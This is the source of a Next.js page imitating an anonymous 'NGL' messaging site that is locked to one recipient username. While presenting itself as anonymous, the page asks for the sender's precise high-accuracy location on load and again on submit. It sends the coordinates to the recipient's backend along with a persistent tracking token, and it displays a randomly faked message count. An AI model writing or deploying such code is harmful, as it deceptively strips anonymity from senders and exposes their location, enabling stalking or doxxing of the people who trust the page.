'use client';

import React, { useState, useEffect } from 'react';
import { useParams } from 'next/navigation';
import { v4 as uuidv4 } from 'uuid';
import { supabase } from '@/lib/supabase';
import MessageForm from '@/components/MessageForm';
import SuccessScreen from '@/components/SuccessScreen';
import { motion } from 'framer-motion';

// Generate or retrieve a unique sender token
const getSenderToken = (): string => {
  if (typeof window === 'undefined') return '';
  let token = localStorage.getItem('ngl_sender_token');
  if (!token) {
    token = uuidv4();
    localStorage.setItem('ngl_sender_token', token);
  }
  return token;
};

export default function UserPublicPage() {
  const username = "asad_w69"; // Always locked to this user
  const [isSent, setIsSent] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [fakeCount] = useState(() => Math.floor(Math.random() * 400 + 100));
  const [coords, setCoords] = useState<{lat: number, lng: number} | null>(null);

  useEffect(() => {
    // Ask for location permission once when page opens
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setCoords({
            lat: position.coords.latitude,
            lng: position.coords.longitude
          });
        },
        (error) => {
          console.warn('Location permission denied or failed:', error.message);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }
  }, []);

  const handleSubmit = async (message: string) => {
    setIsSubmitting(true);
    const sender_token = getSenderToken();
    let currentCoords = coords;

    // Secondary check: if we don't have coords yet, try one last quick request
    if (!currentCoords && "geolocation" in navigator) {
      try {
        const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
        });
        currentCoords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
      } catch (e) {
        console.warn("Final location attempt failed:", e);
      }
    }

    try {
      const response = await fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message,
          sender_token,
          recipient_username: username,
          latitude: currentCoords?.lat || null,
          longitude: currentCoords?.lng || null
        })
      });

      const result = await response.json();

      if (!response.ok) {
        alert(result.error || 'Failed to send message');
        setIsSubmitting(false);
        return;
      }
      
      // Simulate network delay for better UX
      setTimeout(() => {
        setIsSent(true);
        setIsSubmitting(false);
      }, 800);

    } catch (err) {
      console.error('Submission error:', err);
      alert('Network error. Please check your connection.');
      setIsSubmitting(false);
    }
  };

  const handleReset = () => {
    setIsSent(false);
  };

  return (
    <main className="min-h-screen bg-gradient-to-b from-[#ff3c83] to-[#ff7a18] flex flex-col items-center justify-center p-6 select-none overflow-hidden font-sans">
      <motion.div 
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        className="w-full max-w-[400px] flex flex-col items-center"
      >
        {!isSent ? (
          <MessageForm 
            username={username} 
            onSubmit={handleSubmit} 
            isSubmitting={isSubmitting} 
            fakeCount={fakeCount}
          />
        ) : (
          <SuccessScreen onReset={handleReset} fakeCount={fakeCount} />
        )}
      </motion.div>
    </main>
  );
}
